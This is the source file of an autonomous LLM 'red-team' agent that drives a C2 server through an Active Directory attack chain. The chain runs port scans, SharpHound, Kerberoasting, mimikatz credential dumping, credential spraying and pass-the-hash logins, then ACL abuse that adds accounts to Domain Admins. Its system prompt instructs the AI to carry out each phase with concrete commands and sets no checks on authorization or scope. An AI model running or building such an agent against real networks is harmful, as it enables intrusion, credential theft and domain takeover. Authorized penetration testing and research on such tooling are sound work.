"""
C2 Attack-Chain Agent
Architecture: LangGraph stateful workflow + Mem0 persistent memory
LLM: Mistral (mistral-small-latest)
Tools: C2 REST API wrappers + generate_map integration
"""

import os
import sys
import json
import time
import requests as _req
from pathlib import Path
from typing import Annotated, TypedDict
from datetime import datetime
from dotenv import load_dotenv

from mem0 import Memory
from langchain_mistralai import ChatMistralAI
from langchain_core.messages import HumanMessage, SystemMessage, AIMessage
from langchain_core.tools import tool
from langgraph.graph import StateGraph, END
from langgraph.prebuilt import ToolNode
from langgraph.checkpoint.memory import MemorySaver
from langgraph.graph.message import add_messages

load_dotenv()

# ── Path setup: import generate_map from parent project ──────────────────────

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_PROJECT_ROOT))

import generate_map as _gm

# ── Constants ─────────────────────────────────────────────────────────────────

C2_SERVER  = os.getenv("C2_SERVER_URL", "http://127.0.0.1:8080")
LOOT_DIR   = _PROJECT_ROOT / "server" / "loot"
RECON_DUMP = _PROJECT_ROOT / "server" / "recon_latest.json"


# ── C2 HTTP helpers ───────────────────────────────────────────────────────────

def _get(path: str):
    try:
        r = _req.get(f"{C2_SERVER}{path}", timeout=10)
        r.raise_for_status()
        return r.json()
    except Exception as e:
        return {"error": str(e)}


def _post(path: str, payload: dict):
    try:
        r = _req.post(f"{C2_SERVER}{path}", json=payload, timeout=10)
        r.raise_for_status()
        return r.json()
    except Exception as e:
        return {"error": str(e)}


def _poll(agent_id: str, task_id: int, timeout: int = 180, interval: int = 3) -> str:
    """Block until task_id result appears in the server, then return its output."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        rows = _get(f"/results/{agent_id}")
        if isinstance(rows, list):
            for r in rows:
                if r.get("task_id") == task_id:
                    return r.get("output", "")
        time.sleep(interval)
    return f"[timeout] No result for task {task_id} after {timeout}s"


# ── C2 Tools ──────────────────────────────────────────────────────────────────

@tool
def c2_list_agents() -> str:
    """
    List all registered C2 agents.
    Returns a table of agent_id, hostname, username, last_seen.
    Call this first to find an agent to use.
    """
    rows = _get("/agents")
    if isinstance(rows, list) and rows:
        lines = ["agent_id | hostname | username | last_seen"]
        for r in rows:
            lines.append(f"{r['agent_id']} | {r.get('hostname','')} | {r.get('username','')} | {r.get('last_seen','')}")
        return "\n".join(lines)
    return str(rows)


@tool
def c2_get_hosts() -> str:
    """
    List all hosts already discovered by recon and stored in the C2 database.
    Returns IP, hostname, open_ports for each host.
    """
    rows = _get("/hosts")
    if isinstance(rows, list):
        if not rows:
            return "(no hosts in DB yet — run c2_run_recon first)"
        lines = []
        for r in rows:
            lines.append(f"{r.get('ip','')}  {r.get('hostname','(unknown)'):<30}  ports: {r.get('open_ports','')}")
        return "\n".join(lines)
    return str(rows)


@tool
def c2_get_credentials() -> str:
    """
    List all credentials stored in the C2 database (harvested by secretsdump, kerberoast, etc.).
    Returns username, secret, cred_type, source_host.
    """
    rows = _get("/credentials")
    if isinstance(rows, list):
        if not rows:
            return "(no credentials in DB yet)"
        lines = []
        for r in rows:
            preview = r["secret"][:40] + ("…" if len(r["secret"]) > 40 else "")
            lines.append(f"{r['username']:<30}  {r.get('cred_type','?'):<10}  {r.get('source_host','?'):<20}  {preview}")
        return "\n".join(lines)
    return str(rows)


@tool
def c2_get_loot(agent_id: str) -> str:
    """
    List loot files uploaded by a specific agent (SharpHound ZIPs, certipy JSONs, hash files, etc.).
    agent_id: the UUID of the agent whose loot to list.
    """
    data = _get("/loot")
    if "error" in data:
        return str(data)
    files = data.get(agent_id, [])
    if not files:
        return f"(no loot files for agent {agent_id})"
    return "\n".join(files)


@tool
def c2_run_recon(agent_id: str, target: str) -> str:
    """
    Queue a port-scan recon task against target (single IP or CIDR e.g. '10.0.2.0/24').
    Blocks until the scan completes (up to 3 minutes) and returns discovered hosts.
    The results are also persisted to the C2 database.
    """
    res = _post("/recon", {"agent_id": agent_id, "target": target})
    if "error" in res:
        return f"[error] {res['error']}"
    task_id = res.get("task_id")
    print(f"  [recon] task queued — id {task_id}, target {target}")
    output = _poll(agent_id, task_id, timeout=180)
    # Save recon JSON for generate_map use
    try:
        parsed = json.loads(output)
        RECON_DUMP.write_text(json.dumps(parsed), encoding="utf-8")
    except Exception:
        pass
    return output


@tool
def c2_run_sharphound(agent_id: str) -> str:
    """
    Deploy and run SharpHound on the agent for BloodHound / AD enumeration.
    The resulting ZIP is uploaded to the C2 loot store automatically.
    Blocks up to 5 minutes. Returns the uploaded ZIP filename on success.
    """
    res = _post("/task", {"agent_id": agent_id, "task_type": "sharphound", "instruction": ""})
    if "error" in res:
        return f"[error] {res['error']}"
    task_id = res.get("task_id")
    print(f"  [sharphound] task queued — id {task_id}")
    output = _poll(agent_id, task_id, timeout=300)
    return output


@tool
def c2_analyze_sharphound(agent_id: str) -> str:
    """
    Parse the latest SharpHound ZIP from loot and extract the full attack graph.
    Returns:
      - Domain info and Domain Controllers
      - Kerberoastable accounts
      - Local admin relationships (who can admin which machine)
      - ACL attack edges (GenericAll, WriteDACL, ForceChangePassword, AddMember, etc.)
      - All attack paths to Domain Admin with step-by-step chains
    Call this immediately after c2_run_sharphound to plan the attack chain.
    """
    from collections import deque

    agent_loot = LOOT_DIR / agent_id
    if not agent_loot.is_dir():
        return f"[error] No loot directory for agent {agent_id}"

    zips = sorted(agent_loot.glob("*.zip"), key=lambda p: p.stat().st_mtime, reverse=True)
    if not zips:
        return "[error] No SharpHound ZIP found. Run c2_run_sharphound first."

    try:
        sh_data = _gm.load_sharphound(str(zips[0]))
        sid_map = _gm.index_objects(sh_data)
    except Exception as e:
        return f"[error] Failed to parse SharpHound ZIP: {e}"

    lines = []

    # ── Domain info ──────────────────────────────────────────────────────────
    domain_obj = next((o for o in sid_map.values() if o["type"] == "domain"), None)
    domain_name = domain_obj["full_name"].split("@")[-1] if domain_obj else "UNKNOWN"
    dc_list = [o for o in sid_map.values() if o["type"] == "dc"]

    lines.append("=== DOMAIN INFO ===")
    lines.append(f"Domain: {domain_name}")
    for dc in dc_list:
        lines.append(f"DC: {dc['props'].get('name', dc['full_name'])}")
    lines.append("")

    # ── Kerberoastable accounts ───────────────────────────────────────────────
    kerb = [o for o in sid_map.values()
            if o["type"] in ("user", "user_da") and o["props"].get("serviceprincipalnames")]
    if kerb:
        lines.append("=== KERBEROASTABLE ACCOUNTS ===")
        for u in kerb:
            spns = u["props"].get("serviceprincipalnames", [])
            lines.append(f"• {u['full_name']}  (SPN: {', '.join(spns[:2])})")
        lines.append("")

    # ── Local admin relationships ────────────────────────────────────────────
    _IMPLICIT = {"DOMAIN ADMINS", "ENTERPRISE ADMINS", "SCHEMA ADMINS", "ADMINISTRATORS"}
    local_admins = []
    for sid, obj in sid_map.items():
        if obj["type"] not in ("dc", "computer", "workstation"):
            continue
        container = obj["raw"].get("LocalAdmins", {})
        results = container.get("Results", []) if isinstance(container, dict) else container
        for r in results:
            r_sid = (r.get("ObjectIdentifier") or r.get("PrincipalSID") or "").upper()
            r_obj = sid_map.get(r_sid)
            if r_obj and r_obj["name"] not in _IMPLICIT:
                local_admins.append((r_obj["full_name"], obj["full_name"], r_obj["type"]))

    if local_admins:
        lines.append("=== LOCAL ADMIN RELATIONSHIPS ===")
        for admin, machine, atype in local_admins:
            lines.append(f"• {admin} ({atype})  →  LOCAL ADMIN  →  {machine}")
        lines.append("")

    # ── ACL attack edges ─────────────────────────────────────────────────────
    _ACL_RIGHTS = {"GenericAll", "GenericWrite", "WriteOwner", "WriteDacl",
                   "ForceChangePassword", "AllExtendedRights", "AddMember", "Owns"}
    acl_edges = []
    for sid, obj in sid_map.items():
        for ace in obj.get("aces", []):
            right = ace.get("RightName", "")
            if right not in _ACL_RIGHTS:
                continue
            p_sid = ace.get("PrincipalSID", "").upper()
            p_obj = sid_map.get(p_sid)
            if not p_obj or p_obj["name"] in _IMPLICIT:
                continue
            acl_edges.append((p_obj["full_name"], right, obj["full_name"], obj["type"]))

    if acl_edges:
        lines.append("=== ACL ATTACK EDGES ===")
        for src, right, tgt, tgt_type in acl_edges:
            lines.append(f"• {src}  --[{right}]-->  {tgt}  (target type: {tgt_type})")
        lines.append("")

    # ── Attack paths to DA (BFS) ──────────────────────────────────────────────
    # Build adjacency: sid → [(next_sid, edge_label)]
    adj: dict = {}
    for sid, obj in sid_map.items():
        for ace in obj.get("aces", []):
            right = ace.get("RightName", "")
            if right not in _ACL_RIGHTS:
                continue
            p_sid = ace.get("PrincipalSID", "").upper()
            if p_sid in sid_map:
                adj.setdefault(p_sid, []).append((sid, right))
        if obj["type"] == "group":
            for m in obj["raw"].get("Members", []):
                m_sid = m.get("ObjectIdentifier", "").upper()
                if m_sid in sid_map:
                    adj.setdefault(m_sid, []).append((sid, "MemberOf"))

    _PRIV_NAMES = {"DOMAIN ADMINS", "ENTERPRISE ADMINS", "ADMINISTRATORS"}
    targets = {sid for sid, o in sid_map.items()
               if o["type"] == "user_da" or o["name"] in _PRIV_NAMES}
    sources = [(sid, o) for sid, o in sid_map.items() if o["type"] in ("user", "user_disabled")]

    all_paths = []
    for start_sid, _ in sources:
        if start_sid in targets:
            continue
        queue: deque = deque([(start_sid, [(start_sid, None)])])
        visited = {start_sid}
        while queue:
            cur, path = queue.popleft()
            if cur in targets:
                all_paths.append(path)
                break
            for nxt, lbl in adj.get(cur, []):
                if nxt not in visited:
                    visited.add(nxt)
                    queue.append((nxt, path + [(nxt, lbl)]))

    if all_paths:
        all_paths.sort(key=len)
        lines.append("=== ATTACK PATHS TO DOMAIN ADMIN ===")
        for i, path in enumerate(all_paths[:5]):
            parts = [sid_map.get(path[0][0], {}).get("name", path[0][0])]
            for sid, lbl in path[1:]:
                parts.append(f"--[{lbl}]-->")
                parts.append(sid_map.get(sid, {}).get("name", sid))
            lines.append(f"Path {i+1} ({len(path)-1} hops): {' '.join(parts)}")
        lines.append("")

        lines.append("=== RECOMMENDED ATTACK SEQUENCE (SHORTEST PATH) ===")
        shortest = all_paths[0]
        start_obj = sid_map.get(shortest[0][0], {})
        lines.append(f"Starting principal: {start_obj.get('full_name', shortest[0][0])}")
        lines.append("Steps:")
        for j, (sid, lbl) in enumerate(shortest[1:], 1):
            tgt = sid_map.get(sid, {})
            lines.append(f"  Step {j}: [{lbl}] on {tgt.get('full_name', sid)} (type: {tgt.get('type', '?')})")
        lines.append("")

    if not local_admins and not acl_edges and not all_paths:
        lines.append("(No exploitable relationships found in this SharpHound dataset.)")

    return "\n".join(lines)


@tool
def c2_run_certipy(agent_id: str, args: str) -> str:
    """
    Run certipy on the agent for ADCS certificate template enumeration.
    args example: 'find -u administrator@corp.local -p Password123 -dc-ip 10.0.2.10 -json'
    The JSON output is uploaded to loot automatically. Blocks up to 2 minutes.
    """
    if not args.strip():
        return "[error] args cannot be empty. Provide certipy arguments."
    res = _post("/task", {"agent_id": agent_id, "task_type": "certipy", "instruction": args})
    if "error" in res:
        return f"[error] {res['error']}"
    task_id = res.get("task_id")
    print(f"  [certipy] task queued — id {task_id}")
    return _poll(agent_id, task_id, timeout=120)


@tool
def c2_run_kerberoast(agent_id: str) -> str:
    """
    Enumerate Kerberoastable SPN accounts and request TGS tickets natively.
    Returns hashcat-ready $krb5tgs$ hashes. The hash file is also uploaded to loot.
    Blocks up to 2 minutes.
    """
    res = _post("/task", {"agent_id": agent_id, "task_type": "kerberoast", "instruction": ""})
    if "error" in res:
        return f"[error] {res['error']}"
    task_id = res.get("task_id")
    print(f"  [kerberoast] task queued — id {task_id}")
    return _poll(agent_id, task_id, timeout=120)


@tool
def c2_run_secretsdump(agent_id: str, tool_and_args: str) -> str:
    """
    Run a credential-dumping tool on the agent.
    tool_and_args example: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit'
    The tool binary must exist in server/files/. Blocks up to 2 minutes.
    """
    if not tool_and_args.strip():
        return "[error] Provide tool name and arguments."
    res = _post("/task", {"agent_id": agent_id, "task_type": "secretsdump", "instruction": tool_and_args})
    if "error" in res:
        return f"[error] {res['error']}"
    task_id = res.get("task_id")
    print(f"  [secretsdump] task queued — id {task_id}")
    return _poll(agent_id, task_id, timeout=120)


@tool
def c2_authenticate(
    agent_id: str,
    username: str,
    secret: str,
    target: str,
    service: str = "winrm",
    is_hash: bool = False,
) -> str:
    """
    Authenticate against a target host using a credential.
    service: 'winrm' (port 5985/5986), 'smb' (445), or 'wmi' (135).
    Set is_hash=True when secret is an NTLM hash (format :NT or LM:NT or 32-hex).
    Returns success/failure and any command output.
    """
    instruction = f"{username}|{secret}|{target}|{service}"
    res = _post("/task", {"agent_id": agent_id, "task_type": "authenticate", "instruction": instruction})
    if "error" in res:
        return f"[error] {res['error']}"
    task_id = res.get("task_id")
    print(f"  [authenticate] {username}@{target} via {service} — task {task_id}")
    output = _poll(agent_id, task_id, timeout=60)
    return output


@tool
def c2_spray(agent_id: str, target_ip: str) -> str:
    """
    Try ALL stored credentials in the C2 database against target_ip.
    Detects open lateral movement ports (winrm/smb/wmi) from recon data.
    Returns an access matrix showing which credentials work on which services.
    """
    creds = _get("/credentials")
    if not isinstance(creds, list) or not creds:
        return "[-] No credentials in DB. Run c2_run_secretsdump or c2_run_kerberoast first."

    hosts = _get("/hosts")
    if not isinstance(hosts, list):
        return "[-] Could not fetch hosts from DB."

    target_host = next((h for h in hosts if h.get("ip") == target_ip), None)
    if not target_host:
        return f"[-] {target_ip} not in hosts DB — run c2_run_recon first."

    LATERAL_PORTS = {5985: "winrm", 5986: "winrm", 445: "smb", 135: "wmi"}
    open_ports = [int(p) for p in target_host.get("open_ports", "").split(",") if p.strip().isdigit()]
    services = list(dict.fromkeys(LATERAL_PORTS[p] for p in open_ports if p in LATERAL_PORTS))

    if not services:
        return f"[-] No lateral movement ports found for {target_ip} in recon data."

    results = []
    seen = set()
    for cred in creds:
        key = (cred["username"], cred["secret"])
        if key in seen:
            continue
        seen.add(key)
        for svc in services:
            instruction = f"{cred['username']}|{cred['secret']}|{target_ip}|{svc}"
            res = _post("/task", {"agent_id": agent_id, "task_type": "authenticate", "instruction": instruction})
            if "error" in res:
                results.append(f"[-] {cred['username']} / {svc}: error queuing task")
                continue
            task_id = res.get("task_id")
            output = _poll(agent_id, task_id, timeout=45)
            fail_kws = ("winrs error", "system error", "access is denied", "logon failure", "invalid password")
            ok = not any(kw in output.lower() for kw in fail_kws)
            results.append(f"[{'+'if ok else'-'}] {cred['username']:<28} / {svc:<6}  {target_ip}")

    return "\n".join(results) if results else "(no results)"


@tool
def c2_aclabuse(agent_id: str, operation: str, operation_args: str) -> str:
    """
    Exploit an ACL misconfiguration.
    operation choices:
      addmember           <group> <user>
      forcechangepassword <user> <newpassword>
      genericwrite        <target> <attribute> <value>
      writedacl           <target> <principal> <right>
      writeowner          <target> <new_owner>
    operation_args: positional arguments as a space-separated string.
    Example: operation='addmember', operation_args='Domain Admins backdoor'
    Blocks up to 60 seconds.
    """
    valid_ops = {"addmember", "forcechangepassword", "genericwrite", "writedacl", "writeowner"}
    op = operation.lower().strip()
    if op not in valid_ops:
        return f"[-] Unknown operation '{op}'. Valid: {', '.join(valid_ops)}"
    instruction = op + "|" + "|".join(operation_args.split())
    res = _post("/task", {"agent_id": agent_id, "task_type": "aclabuse", "instruction": instruction})
    if "error" in res:
        return f"[error] {res['error']}"
    task_id = res.get("task_id")
    print(f"  [aclabuse] {op} — task {task_id}")
    return _poll(agent_id, task_id, timeout=60)


@tool
def c2_generate_map(agent_id: str, output_path: str = "network_map.html") -> str:
    """
    Generate a network intelligence HTML map from all collected data.
    Automatically finds the latest recon JSON and SharpHound ZIP from loot.
    Also includes certipy output if available.
    Returns the path of the generated network_map.html file.
    Call this as the final step once recon + SharpHound are done.
    """
    # ── Find SharpHound ZIP ───────────────────────────────────────────────────
    agent_loot = LOOT_DIR / agent_id
    sharphound_zip = None
    certipy_json = None

    if agent_loot.is_dir():
        zips = sorted(agent_loot.glob("*.zip"), key=lambda p: p.stat().st_mtime, reverse=True)
        if zips:
            sharphound_zip = str(zips[0])
        jsons = sorted(agent_loot.glob("*.json"), key=lambda p: p.stat().st_mtime, reverse=True)
        if jsons:
            certipy_json = str(jsons[0])

    if not sharphound_zip:
        return "[error] No SharpHound ZIP found in loot. Run c2_run_sharphound first."

    # ── Find recon JSON ────────────────────────────────────────────────────────
    recon_file = None
    if RECON_DUMP.exists():
        recon_file = str(RECON_DUMP)
    else:
        # Try to reconstruct from results DB
        rows = _get(f"/results/{agent_id}")
        if isinstance(rows, list):
            for r in rows:
                if r.get("task_type") == "recon":
                    try:
                        parsed = json.loads(r["output"])
                        RECON_DUMP.write_text(json.dumps(parsed), encoding="utf-8")
                        recon_file = str(RECON_DUMP)
                        break
                    except Exception:
                        pass

    # ── Run generate_map pipeline ─────────────────────────────────────────────
    try:
        if recon_file:
            recon_hosts, subnet = _gm.load_recon(recon_file)
        else:
            recon_hosts, subnet = [], ""

        sh_data = _gm.load_sharphound(sharphound_zip)
        certipy_data = _gm.load_certipy(certipy_json) if certipy_json else {}

        sid_map = _gm.index_objects(sh_data)

        domain_obj  = next((o for o in sid_map.values() if o["type"] == "domain"), None)
        domain_name = domain_obj["full_name"].split("@")[-1] if domain_obj else "UNKNOWN"
        domain_sid  = next((k for k, v in sid_map.items() if v["type"] == "domain"), "")
        scan_date   = datetime.now().strftime("%Y-%m-%d")

        nodes = _gm.build_nodes(sid_map, recon_hosts, certipy_data)
        edges = _gm.build_edges(sid_map, nodes)
        stats = _gm.compute_stats(sid_map, recon_hosts, edges)
        banner, path_ids = _gm.find_attack_path(sid_map, nodes, edges)

        html = _gm.render_html(
            nodes, edges, stats, recon_hosts, sid_map,
            domain_name, domain_sid, subnet, scan_date,
            banner, path_ids, certipy_data,
        )

        out = Path(output_path)
        out.write_text(html, encoding="utf-8")

        summary = (
            f"[+] Map generated → {out.resolve()}\n"
            f"    Domain: {domain_name}  |  Hosts: {stats['hosts']}  "
            f"|  Users: {stats['users']}  |  Kerberoastable: {stats['kerberoastable']}  "
            f"|  Critical ACLs: {stats['critical_acl']}\n"
        )
        if banner:
            summary += f"    Attack path: {banner}"
        return summary

    except Exception as e:
        return f"[error] Map generation failed: {e}"


@tool
def c2_ask_human(question: str) -> str:
    """
    Ask the operator a question when clarification or explicit permission is needed
    before executing a destructive or sensitive step.
    """
    print(f"\n[AGENT REQUEST]: {question}")
    return input(">> Your answer: ").strip()


# ── Agent state ───────────────────────────────────────────────────────────────

class C2AgentState(TypedDict):
    messages: Annotated[list, add_messages]
    user_id:  str
    memories: str   # injected from Mem0 before each reasoning step


_SYSTEM_PROMPT = """You are an autonomous red-team AI agent integrated into the Lat-Mov-Auto C2 framework.
Your mission: execute a complete attack chain — recon → AD enumeration → credential harvesting → attack path execution → DA.

MEMORY FROM PREVIOUS SESSIONS:
{memories}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PHASE 1 — DISCOVERY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. c2_list_agents()                     → pick agent with most recent last_seen
2. c2_run_recon(agent_id, subnet)       → port-scan, find hosts + DC IPs

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PHASE 2 — AD ENUMERATION + ANALYSIS + VISUALIZATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
3. c2_run_sharphound(agent_id)          → BloodHound collection, ZIP uploaded to loot
4. c2_analyze_sharphound(agent_id)      → parse ZIP, extract full attack graph:
     • Local admin relationships  (user/group → LOCAL ADMIN → machine)
     • ACL attack edges           (GenericAll, ForceChangePassword, WriteDACL, AddMember …)
     • All attack paths to DA     (step-by-step chains from any user to Domain Admin)
     • Kerberoastable accounts
   READ this output carefully — it drives everything in Phase 4.
5. c2_generate_map(agent_id)            → generate network_map.html visualization

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PHASE 3 — CREDENTIAL HARVESTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
6. c2_run_kerberoast(agent_id)          → TGS hashes for kerberoastable accounts
7. c2_run_secretsdump(agent_id, 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit')
   → only if mimikatz.exe is in server/files/; implant must be running as Administrator
8. c2_get_credentials()                 → list ALL credentials now in the DB

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PHASE 4 — ATTACK EXECUTION (credential-driven, SharpHound-guided)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Cross-reference the credentials from Phase 3 with the SharpHound analysis from Phase 2.
Execute BOTH paths A and B whenever matches are found:

  ── PATH A: LOCAL ADMIN → SECRETSDUMP ──────────────────────
  For every LOCAL ADMIN relationship in the analysis output:
    1. Check if you have credentials in the DB for that admin user
    2. If YES:
       a. c2_authenticate(agent_id, username, password, target_ip, service)
          → verifies the credentials work on the target
       b. If access confirmed → c2_run_secretsdump(agent_id, 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit')
          → dumps credentials from the target machine
       c. c2_get_credentials() → update your view of available creds
    Example: analysis says "jsmith → LOCAL ADMIN → CORPSRV01" and you have jsmith:Password1
      → c2_authenticate(agent_id, "jsmith", "Password1", "10.0.2.20", "winrm")
      → c2_run_secretsdump(agent_id, "mimikatz.exe sekurlsa::logonpasswords exit")

  ── PATH B: ACL CHAIN → DOMAIN ADMIN ───────────────────────
  For every ATTACK PATH in the analysis output:
    1. Check if you have credentials for the STARTING PRINCIPAL of that path
    2. If YES: execute each step in the chain one at a time:
       - Before EVERY step: call c2_ask_human() to confirm
       - Use c2_aclabuse() for each ACL operation
       - After ForceChangePassword: the new password is the one you set — use it next
       - After AddMember to Domain Admins: the chain is complete
    Example path: "jsmith --[ForceChangePassword]--> svc_backup --[AddMember]--> Domain Admins"
    And you have jsmith credentials:
      Step 1: c2_ask_human("Ready to ForceChangePassword on svc_backup using jsmith. Proceed?")
              c2_aclabuse(agent_id, "forcechangepassword", "svc_backup NewP@ssw0rd!")
      Step 2: c2_ask_human("Ready to AddMember: add svc_backup to Domain Admins. Proceed?")
              c2_aclabuse(agent_id, "addmember", "Domain Admins svc_backup")

  ── FALLBACK: CREDENTIAL SPRAY ──────────────────────────────
  If no credential matches found in paths A or B:
    c2_spray(agent_id, target_ip)   → try all creds on all lateral targets

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PHASE 5 — ADCS (optional)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
If a DC was found and credentials are available:
  c2_run_certipy(agent_id, "find -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -json")

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
RULES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- ALWAYS start with c2_list_agents() — you need agent_id before anything else.
- ALWAYS call c2_analyze_sharphound() right after c2_run_sharphound() — this is mandatory.
- ALWAYS cross-reference c2_get_credentials() with the analysis before Phase 4.
- ALWAYS call c2_ask_human() before every ACL abuse or destructive action.
- If a task fails or times out → skip it, continue to the next step.
- Do NOT retry indefinitely.
- Always end with c2_generate_map() even if earlier phases were incomplete.

Current date/time: {datetime}
"""


# ── LangGraph workflow ────────────────────────────────────────────────────────

class C2Agent:
    def __init__(self, db_path: str = "c2_mem0.db"):
        # ── Mem0 persistent memory (Mistral via OpenAI-compat shim) ──────────
        self.memory_store = Memory.from_config({
            "llm": {
                "provider": "openai",
                "config": {"model": "mistral-tiny"},
            },
            "vector_store": {
                "provider": "qdrant",
                "config": {"path": db_path, "embedding_model_dims": 1024},
            },
            "embedder": {
                "provider": "openai",
                "config": {"model": "mistral-embed"},
            },
        })

        self.llm = ChatMistralAI(
            model=os.getenv("MISTRAL_MODEL", "open-mistral-7b"),
            api_key=os.getenv("MISTRAL_API_KEY"),
        )
        self.tools = [
            c2_list_agents,
            c2_get_hosts,
            c2_get_credentials,
            c2_get_loot,
            c2_run_recon,
            c2_run_sharphound,
            c2_analyze_sharphound,
            c2_run_certipy,
            c2_run_kerberoast,
            c2_run_secretsdump,
            c2_authenticate,
            c2_spray,
            c2_aclabuse,
            c2_generate_map,
            c2_ask_human,
        ]
        self.llm_with_tools = self.llm.bind_tools(self.tools)
        self.app = self._build_graph().compile(checkpointer=MemorySaver())

    def _build_graph(self):
        graph = StateGraph(C2AgentState)
        graph.add_node("retrieve_memory", self._retrieve_memory)
        graph.add_node("reason", self._reason)
        graph.add_node("action", ToolNode(self.tools))
        graph.set_entry_point("retrieve_memory")
        graph.add_edge("retrieve_memory", "reason")
        graph.add_conditional_edges("reason", self._route, {"continue": "action", "end": END})
        graph.add_edge("action", "reason")
        return graph

    def _retrieve_memory(self, state: C2AgentState):
        """Pull relevant memories from Mem0 based on the latest message."""
        query = state["messages"][-1].content
        results = self.memory_store.search(query, filters={"user_id": state["user_id"]})
        mem_str = "\n".join(m["memory"] for m in results.get("results", []))
        return {"memories": mem_str or "(no prior memories for this target)"}

    def _reason(self, state: C2AgentState):
        system = SystemMessage(content=_SYSTEM_PROMPT.format(
            memories=state.get("memories", ""),
            datetime=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        ))
        wait = 10
        for attempt in range(5):
            try:
                response = self.llm_with_tools.invoke([system] + state["messages"])
                return {"messages": [response]}
            except Exception as e:
                if "429" in str(e) and attempt < 4:
                    print(f"  [LLM 429] rate limited — retrying in {wait}s ({attempt+1}/5)")
                    time.sleep(wait)
                    wait *= 2
                else:
                    print(f"  [LLM error]: {e}")
                    return {"messages": [AIMessage(content=f"LLM error: {e}")]}

    def _route(self, state: C2AgentState):
        last = state["messages"][-1]
        if hasattr(last, "tool_calls") and last.tool_calls:
            return "continue"
        return "end"

    def run(self, subnet: str, session_id: str = "c2-session") -> str:
        config = {"configurable": {"thread_id": session_id}}
        prompt = (
            f"Begin the full attack chain against subnet: {subnet}\n"
            "Follow all phases in order. Report your findings at each step."
        )
        print(f"\n[C2 Agent] Starting attack chain against {subnet}\n{'='*60}")

        final = self.app.invoke(
            {
                "messages": [HumanMessage(content=prompt)],
                "user_id":  session_id,
                "memories": "",
            },
            config=config,
        )

        report = final["messages"][-1].content

        # ── Persist key findings back to Mem0 ─────────────────────────────────
        self.memory_store.add(prompt,  user_id=session_id)
        self.memory_store.add(report,  user_id=session_id)

        return report
